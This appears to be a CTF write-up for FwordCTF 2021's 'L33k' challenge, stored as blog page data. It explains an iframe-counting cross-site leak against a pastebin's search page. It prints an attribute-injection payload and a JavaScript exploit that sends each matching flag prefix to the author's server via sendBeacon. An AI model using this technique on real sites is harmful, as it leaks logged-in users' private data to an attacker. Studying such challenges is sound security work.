{"componentChunkName":"component---src-templates-blog-post-js","path":"/FwordCTF-2021-L33k/","result":{"data":{"site":{"siteMetadata":{"title":"downgrade"}},"markdownRemark":{"id":"f8fa2cb2-666c-55c5-a9d8-0758f04f7158","excerpt":"Well as always you have everything good luck :D Typical pastebin chall :-( https://l33k.fword.tech/ tl;dr use iframe counting cross site leak on  to extract the…","html":"<blockquote>\n<p>Well as always you have everything good luck :D Typical pastebin chall :-(</p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://l33k.fword.tech/\">https://l33k.fword.tech/</a></p>\n</blockquote>\n<h1 id=\"tldr\" style=\"position:relative;\"><a href=\"#tldr\" aria-label=\"tldr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>tl;dr</h1>\n<p>use iframe counting cross site leak on <code class=\"language-text\">/search</code> to extract the flag byte by byte</p>\n<hr>\n<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<p>Reading the source code, the flag is stored in a paste owned by the admin.</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pastes<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'1a4c2f59a482ebcae1da00cf3a88cebfd42a924367821ad38ff9bd1aZdFgY747'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'FwordCTF{REDACTED}'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'kahla'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>There is also an admin bot at <code class=\"language-text\">/report</code> that logs in and visits the provided url.</p>\n<p>Creating a paste with basic xss/HTML injection quickly confirms that that is not the correct route.</p>\n<h1 id=\"search\" style=\"position:relative;\"><a href=\"#search\" aria-label=\"search permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>/search</h1>\n<p>The <code class=\"language-text\">/search</code> endpoint is used to search for substrings within your pastes. If you have a paste with the text <code class=\"language-text\">Test</code>, and you search for <code class=\"language-text\">Te</code>, the id of that paste will be displayed on the page.</p>\n<p>There are three javascript elements on the page. The most interesting of which is the following (with the value of <code class=\"language-text\">res</code> being the result of the query):</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> out<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"div\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n\tout<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"out\"</span><span class=\"token operator\">+</span><span class=\"token function\">randomId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">var</span> res<span class=\"token operator\">=</span><span class=\"token string\">\"Result found: QZKZ3MT27Z4FO15U3LMDKFHV5J3HFZOX6S3P3UUX2DG8ER2OS6Q0QDLC0CZRQTCF\"</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> a<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"iframe\"</span><span class=\"token punctuation\">)</span>\n\ta<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"https://l33k.fword.tech/view?id=\"</span><span class=\"token operator\">+</span>res<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\tdocument<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">var</span> res<span class=\"token operator\">=</span><span class=\"token string\">\"Result found: QZKZ3MT27Z4FO15U3LMDKFHV5J3HFZOX6S3P3UUX2DG8ER2OS6Q0QDLC0CZRQTCF\"</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\tout<span class=\"token punctuation\">.</span>textContent<span class=\"token operator\">=</span>res\n\tdocument<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>If <code class=\"language-text\">out.setAttribute(\"id\",\"out\"+randomId())</code> errors, and one of the user’s pastes include the query string, then an iframe is created with the contents of the paste.</p>\n<h2 id=\"creating-an-error\" style=\"position:relative;\"><a href=\"#creating-an-error\" aria-label=\"creating an error permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating an error</h2>\n<p>There are two other script elements on the page. One for appending an image with a given src:</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">escape</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token function\">unescape</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'['</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">></span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> image <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span>searchParams<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'img'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token string\">\"/static/search.jpg\"</span><span class=\"token punctuation\">;</span>\ndocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;img src=\"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">escape</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\" /></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>And one for defining the <code class=\"language-text\">randomId()</code> function:</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">randomId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> idint<span class=\"token operator\">=</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">1e18</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> idint<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>The <code class=\"language-text\">img</code> param is input straight into <code class=\"language-text\">&lt;img src=\"${escape(image)}\" /></code>, and only filters <code class=\"language-text\">&lt;</code> and <code class=\"language-text\">></code>. Along with the CSP, XSS is not possible. However, a new attribute can be created by supplying an <code class=\"language-text\">img</code> param like this: <code class=\"language-text\">x\" x=1</code>. If the new attribute doesn’t have a value, the following HTML will close the attribute and tag on the next occurences of <code class=\"language-text\">\"</code> and <code class=\"language-text\">></code>. Supplying the <code class=\"language-text\">img</code> param <code class=\"language-text\">x\" x=</code> will result in the next script element (in which <code class=\"language-text\">randomId()</code> is defined) to break.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7efff0daf00de28362f2dc6517f83a7f/89048/1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.151898734177216%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqElEQVQY04WMTQuCQBiE/f//ooO26y5SeQ6KbtXRoFMUBJHiISy/2t0nlA4SVAMPMy/DvN5kOkVrTRRFzOKYMAyRUvaulOqzEBIpBX4wZuQrlAjQwke90d0tgz57xhiqqsJayz9dCjjkhmsNaUPvn3jDgXPuK9Y5duc7yyRjkaTMk4zVLme9v7E5Pth2nB54v54M6fRsW+qyoinvNGVBW5fgnoDpWsDyAhopJRqCNUv8AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/7efff0daf00de28362f2dc6517f83a7f/f058b/1.png\"\n        srcset=\"/static/7efff0daf00de28362f2dc6517f83a7f/c26ae/1.png 158w,\n/static/7efff0daf00de28362f2dc6517f83a7f/6bdcf/1.png 315w,\n/static/7efff0daf00de28362f2dc6517f83a7f/f058b/1.png 630w,\n/static/7efff0daf00de28362f2dc6517f83a7f/40601/1.png 945w,\n/static/7efff0daf00de28362f2dc6517f83a7f/89048/1.png 1242w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>Now when <code class=\"language-text\">randomId()</code> is called, there will be an error as it is never defined.</p>\n<p>If the query matches a paste, an iframe of the paste is created.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7cbb1a5836f53c5764fd0d0a252ea1bd/46e51/2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.68354430379747%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY052PvQqEMBCE82JaiIhaCxZyFr61mMSohVr5BydGcY4sKHJwzS18zM7ukjAsyzKk6QtJkiCOY0RRBN/34XkeEYYhqeu6NA+CAI7jwLIs2LZ9c3m2LAvmeSamaSLGcbx5+mEYyFeVQlXX6PseXdcRbduSMvxR+77/3DGtNXatsW0boR/95b9n73XFeZ43x3EQ5o41TQNZSnDOURQFlFIopaTeIISA4JxUSok8zymuiWgiGzWfXI9+AD0qV/tpQkeGAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/7cbb1a5836f53c5764fd0d0a252ea1bd/f058b/2.png\"\n        srcset=\"/static/7cbb1a5836f53c5764fd0d0a252ea1bd/c26ae/2.png 158w,\n/static/7cbb1a5836f53c5764fd0d0a252ea1bd/6bdcf/2.png 315w,\n/static/7cbb1a5836f53c5764fd0d0a252ea1bd/f058b/2.png 630w,\n/static/7cbb1a5836f53c5764fd0d0a252ea1bd/40601/2.png 945w,\n/static/7cbb1a5836f53c5764fd0d0a252ea1bd/46e51/2.png 1003w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<h2 id=\"creating-an-exploit\" style=\"position:relative;\"><a href=\"#creating-an-exploit\" aria-label=\"creating an exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating an exploit</h2>\n<p>If the page is opened in a <code class=\"language-text\">window</code> cross-origin, the contents of the page cannot be read, however the number of iframes open in the window can be. <a href=\"https://xsleaks.com/docs/attacks/frame-counting/\">xsleaks.com</a> is a good resource for understanding cross-site leak attacks.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> chars <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%()*+,-./:;&lt;=>?@[\\]^`{}_|~'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> flag <span class=\"token operator\">=</span> <span class=\"token string\">'FwordCTF{'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">testFlag</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">flag</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">https://l33k.fword.tech/search?img=%22%20x=&amp;query=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// Wait for the page to load </span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Read the number of iframes loaded   </span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>win<span class=\"token punctuation\">.</span>length <span class=\"token operator\">>=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            navigator<span class=\"token punctuation\">.</span><span class=\"token function\">sendBeacon</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;MY_SERVER>'</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> chars<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">testFlag</span><span class=\"token punctuation\">(</span>flag <span class=\"token operator\">+</span> chars<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p>The above javascript will open a window at <code class=\"language-text\">https://l33k.fword.tech/search</code> for each character. If the pastes include the query string, an iframe will be created. If an iframe is created, that window will send a request to my server with the query string. This process can be repeated, adding each character to the query, until the full flag is extracted.</p>\n<p><img src=\"https://i.imgur.com/tTDliwr.png\" alt=\"\"></p>","frontmatter":{"title":"FwordCTF 2021 - L33k","date":"September 29, 2021","description":"a straightforward but interesting xs leak challenge from FwordCTF 2021"}},"previous":null,"next":{"fields":{"slug":"/idekctf-2021-web-author-writeups/"},"frontmatter":{"title":"idekCTF 2021 - Author Web Writeups"}}},"pageContext":{"id":"f8fa2cb2-666c-55c5-a9d8-0758f04f7158","previousPostId":null,"nextPostId":"ec65eaed-3151-5027-a79b-7084e95fa01d"}},"staticQueryHashes":["1044197826","2841359383"]}